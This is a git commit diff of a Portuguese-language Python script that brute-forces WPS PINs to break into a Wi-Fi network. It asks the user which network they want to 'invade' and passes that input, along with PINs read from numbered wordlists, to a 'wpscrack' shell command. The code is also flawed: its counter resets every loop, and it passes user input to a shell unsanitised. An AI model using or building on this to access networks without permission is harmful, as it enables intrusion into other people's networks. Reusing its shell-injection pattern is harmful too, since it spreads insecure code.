c17e60bd095424a294e0e4035c34e8ab245cb504
Wolf404 <96954406+WBs234@users.noreply.github.com>
2023-06-13 07:50:03 -0300

    Update Script.py

--- Script.py
+++ Script.py
@@ -1,7 +1,9 @@
-
+import time
+import os
 import netifaces
 import subprocess
 
+os.system("clear")
 def get_wifi_interface():
     interfaces = netifaces.interfaces()
     for interface in interfaces:
@@ -10,19 +12,22 @@ def get_wifi_interface():
     return None
 
 wifi_interface = get_wifi_interface()
-
+time.sleep(1)
 if wifi_interface:
-    print(f"Nome da interface Wi-Fi: {wifi_interface}")
+    print(f"Nome da interface Wi-Fi: {wifi_interface} (coloque a baixo)")
 else:
     print("Nenhuma interface Wi-Fi encontrada.")
-
+time.sleep(1)
+print("")
 while True:
     n=0
     n=n+1
+    s="0"
+    s=str(n)
 
     wifi_interface = input("Qual o nome da sua interface Wifi? ")
-    ssid = input("Qual o nome da rede que deseja invadir?")
-    pins_file = "wordlistofc"+n+".txt"
+    ssid = input("Qual o nome da rede que deseja invadir? ")
+    pins_file = "wordlistofc"+s+".txt"
     def connect_wifi(pin):
         command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
         output = subprocess.run(command, shell=True, capture_output=True, text=True)
